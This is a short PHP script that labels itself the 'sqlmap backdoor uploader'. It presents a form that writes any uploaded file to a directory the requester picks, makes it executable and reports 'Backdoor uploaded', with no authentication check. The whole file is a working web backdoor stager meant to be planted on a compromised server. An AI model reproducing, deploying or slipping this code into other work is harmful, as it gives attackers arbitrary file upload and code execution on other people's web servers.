<?php
if (isset($_REQUEST["upload"])) {
    $dir=$_REQUEST["uploadDir"];
    $file=$HTTP_POST_FILES["file"]["name"];
    @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"], $dir . "/" . $file) or die();
    @chmod($dir . "/" . $file, 0755);
    echo "Backdoor uploaded";
}
else {
    echo "<form action=" . $_SERVER["PHP_SELF"] . " method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap backdoor uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=WRITABLE_DIR> <input type=submit name=upload value=upload></form>";
}
?>
